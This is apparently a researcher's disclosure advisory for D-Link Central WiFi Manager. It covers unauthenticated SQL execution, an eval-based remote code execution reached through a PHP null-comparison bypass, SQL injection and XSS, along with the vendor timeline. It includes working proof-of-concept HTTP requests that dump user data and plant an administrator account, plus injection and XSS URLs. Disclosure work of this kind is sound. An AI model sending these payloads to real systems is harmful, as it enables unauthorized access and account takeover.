---
title: "D-link Central WiFi Manager(CWM-100) Multiple Vulnerabilities"
date: 2019-02-21 00:30:00
---
# **[Vulnerability Description]()**
  **&ensp;&ensp;&ensp;&ensp;D-Link® Central WiFiManager software controller helps network administrators streamline their wireless access point (AP) management workflow. Central WiFi Manager is an innovative approach to the more traditional hardware-based multiple access point management system. It uses a centralized server to both remotely manage and monitor wireless APs on a network. Whether deployed on a local computer or hosted on a public cloud service, Central WiFi Manager can be easily integrated into existing networks in conjunction with supporting D-Link wireless APs, to help eliminate existing bottlenecks for wireless traffic.**

  **&ensp;&ensp;&ensp;&ensp;Vulnerabilities were found in the Central WiFiManager Software Controller, allowing unauthenticated attackers to execute arbitrary SQL command to obtain any data in the database including admin passwords, and could lead to remote code execution. Also SQL injecion and XSS vulnerabilities were found.All of the vulnerabilities found do not require any authorization.**
<BR><BR>
# **[Vulnerable Packages]()**
**&ensp;&ensp;&ensp;&ensp;Central WifiManager Before Ver. 1.03R0100- Beta6**
<BR><BR>
# **[Credits]()**
**&ensp;&ensp;&ensp;&ensp;These vulnerabilities were discovered and researched by M3@ZionLab from DBAppSecurity.**
<BR><BR>
# **[Technical Description / Proof of Concept Code]()**
* ### **1. Arbitrary SQL Command Query**
Vulnerable cgi: /web/Public/Conn.php

```php
<?php
include("common.php");

define("DBselect",'S');
define("DBUpdate",'U');
define("DBDel",'D');
define("DBAdd",'A');

$dbAction = isset($_POST['dbAction'])?$_POST['dbAction']:""; 
$dbSQL = isset($_POST['dbSQL'])?$_POST['dbSQL']:"";
if($dbAction == DBselect) //if da action is select
{
	Act_DBSelect(stripslashes($dbSQL));
}
if($dbAction == DBDel)
{
	Act_DBAction(stripslashes($dbSQL));
}
if($dbAction == DBUpdate)
{
	Act_DBAction(stripslashes($dbSQL));
}
if($dbAction == DBAdd)
{
	Act_DBAction(stripslashes($dbSQL));
}


function Act_DBSelect($SQL)
{
	global $Db_Handle;
		
	if($Db_Handle)
	{
		
		$result = pg_query($Db_Handle,$SQL);
	}
	else
	{
		if(!LinkDataBase()) //link database error;
		{
			CreateErrorXML(1,'Link error,please check you host,port,dbname,user,password.');

            pg_close($Db_Handle);
			return 0;		
		}
		$result = pg_query($Db_Handle,$SQL);

	}//end if($Db_Handle)
	if (!$result) //if return Null   ,show error
	{
		$error = pg_last_error($Db_Handle);

		CreateErrorXML(2,'SQL ERROR:SQL = '.stripslashes($SQL))	;
        file_put_contents("sql_error.temp",stripslashes($SQL));

        pg_close($Db_Handle);
		return 0;
	}else
	{
		CreateXML($result,0,'ok');//get data ok and create xml file.
        //file_put_contents("sql_ok.temp",stripslashes($SQL));

        pg_close($Db_Handle);
		return  1;
	}//end if (!$result) 
	
    pg_close($Db_Handle);
	return $result;
}
```
<BR>
**&ensp;&ensp;&ensp;&ensp;The code above is a function of a database query. Since the file does not have a verification session, it can be accessed directly without login. So the attacker can directly access the file and call the database query interface to execute any SQL statement.**
<BR><BR>
> **POC:**
<br>

```python
POST /Public/Conn.php HTTP/1.1
Host: 172.16.130.137
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.24; rv:56.0)
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

dbAction=S&dbSQL=select * from usertable
```
<br>
**&ensp;&ensp;&ensp;&ensp;Through this step, attackers can obtain the username and password from the database for login. The password is encrypted by md5 and may not be cracked under certain circumstances. It doesn't matter, attackers don't need to crack the password at all, they can add an administrator by sending payload below:**
<br>

```python
POST /Public/Conn.php HTTP/1.1
Host: 172.16.130.137
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.24; rv:56.0)
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 119

dbAction=S&dbSQL=INSERT INTO usertable(username,userpassword,level) VALUES ('attackers','21232f297a57a5a743894a0e4a801fc3',1)
```

**&ensp;&ensp;&ensp;&ensp;This step successfully adds a new administrator named attackers with password admin.**
<br>
<br>
* ### **2. Remote Command Execution**

&ensp;&ensp;&ensp;&ensp;Vulnerable cgi: /web/Lib/Action/IndexAction.class.php

```php
public function index()
{
	...
	if(isset($_COOKIE["username"]) && isset($_COOKIE["password"]))
	{
		$name = $_COOKIE["username"];
		$password = $_COOKIE["password"];
		$this->doLogin($name,$password,FALSE);
		return;
	}
	$this->display("Index:login");
}

public function doLogin($Username,$Password, $issavelogin=FALSE)
{
	//session_start();
	$Privatekey = $_SESSION['USER_PRIVATEKEY']; 
	$curTime = $_POST['curTime'];
	if( $Privatekey != $Password )
	{
		 session_destroy();
		 cookie('username',null);
		 cookie('password',null);

		 $Err = "pwError";

		 $this->assign('errmsg',L($Err));
		 $this->assign('title',L($Err));
		 $this->display('error');
		 return;
	}
	$Socket = new SocketCommand();
	$Password = $_SESSION['USER_PASSWORD'];
	$Receive = $Socket->send("CNa*Na*Na*",0x01,strlen($Username),$Username,strlen($Password),$Password,1,"0");
//
	if ($Receive["code"] == 100)
	{
		...
	}
}

public function send()
{
	session_start();
	$this->serverId = $_SESSION['APM_SERVER_ID'];
	$this->userId = $_SESSION['USER_ID'];
	
	$this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	...
	$Params = func_get_args();
	$ft="a*NNC".$Params[0];

	$ParaString = "";
	for($i = 1;$i < count($Params);$i++)
	{
		if($i > 1)
		{
			$ParaString .= ',';
		}

		if(is_string($Params[$i]))
		{
			if(!strpos($Params[$i], '"'))
			{
				$ParaString .= '"'.$Params[$i].'"';
			}
			else
			{
				$ParaString .= "'".$Params[$i]."'";
			}
		}
		else
		{
			$ParaString .= $Params[$i];
		}
	}
	eval('$Binnary=pack("'.$ft.'","'.C(MAGID).'","'.$this->serverId.'","'.$this->userId.'",0x01,'.$ParaString.');'); 
}
```
<br>
**&ensp;&ensp;&ensp;&ensp;Extract a very important piece of code:**
<br>
```php
if( $Privatekey != $Password )
{
    code A
    return
}
code B
```

<br>
**&ensp;&ensp;&ensp;&ensp;```$Privatekey``` is a valid UserPass session generated by the web server when a user logs in successfully. The code above seems that attackers without successful login can only goto code A and exit, never trigger the eval function of the code B block.**<br>
**&ensp;&ensp;&ensp;&ensp;However PHP is a weakly typed language, attackers do not know the password and cannot log in successfully, the server will not generate the ```USER_PRIVATEKEY``` field in the session, so the value of the variable ```$Privatekey``` is NULL.**<br>
**&ensp;&ensp;&ensp;&ensp;In PHP,  ```NULL == ''``` returns True, so attackers can make ```$Privatekey == $Password``` be True by passing the value of the password as empty. And finally attackers trigger the eval function by using parameter username to inject evil code and parameter password to null to bypass authentication.**
<br>
<br>
> **POC:**
<br>

![image1](https://user-images.githubusercontent.com/36913943/49587572-317a1200-f99f-11e8-95c4-a436df0287a2.png)

<BR>
<BR>
* ### **3. SQL Injection**

&ensp;&ensp;&ensp;&ensp;Vulnerable cgi: /web/Lib/Action/PayAction.class.php

```php
public function passcodeAuth()
{
	$currentLang = $this->getLang();
	$this->curlang =  $currentLang;
	C('TMPL_PARSE_STRING.__CSS__','/public/css/'.$currentLang);

	$Model = new Model();
	$SQL = "SELECT * FROM ordertable WHERE passcode='" . urldecode($_GET['passcode']) . "' LIMIT 1";
	$dbDataResult = $Model->query($SQL);
	$dbData = $dbDataResult[0];

	$json_string =  $this->apigetinfo($dbData['cwmkey']);
	$json_data = json_decode($json_string,true);

	$SQL = "SELECT * FROM usertableauthenticator WHERE clientpass='" . urldecode($_GET['passcode']) . "' LIMIT 1";
	$passcodeDataResult = $Model->query($SQL);
	$passcodeData = $passcodeDataResult[0];
     …
}
```
<br>
**&ensp;&ensp;&ensp;&ensp;Obviously, there is a SQL injection vulnerability through parameter ```passcode```, attackers can obtain sensitive data from the database.**
<br><br>
> **POC:**
<br>

```php
https://172.16.130.137/index.php/Pay/passcodeAuth?passcode=1';SELECT PG_SLEEP(3)
```
* ### **4. XSS**

> **POC:**

```php
https://172.16.130.137/index.php/Pay/passcodeAuth?passcode=1<script>alert(1)</script>
```
<BR>
# **[Summary]()**<br>
**&ensp;&ensp;&ensp;&ensp;There should be some more SQL injection and XSS points. I hope when the vendor releases a new patch which can not only fix the vulnerability in the report I mentioned above, but also considers using the global dangerous character filtering scheme to ensure each variable that enters into the SQL statement is filtered.**

<BR>
# **[Report Timeline]()**
* **2018-11-19: Sent an initial notification to D-Link, including a draft advisory.**
* **2018-11-20: D-Link replied they were working on new patches to address some security issues and asked the specific version I tested.**
* **2018-11-21: Sent the vulnerability report.**
* **2018-11-21: D-Link informed R&D are in process of a release candidate and my vulnerability fixes wolud be in the next version about 45 days later.**
* **2018-11-24: D-Link informed R&D worked it out and notified me the fixed version will be available on 11/30.**
* **2018-11-30: Sent an email to request a status update**
* **2018-12-01: D-Link sent me a new beta version for test**
* **2018-12-03: Retested the new version and found that R&D has already patched these vulnerabilities**
* **2019-07-09: CVE assigned and make a disclosure.**


<BR>
# **[Disclaimer]()**										
**The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.**
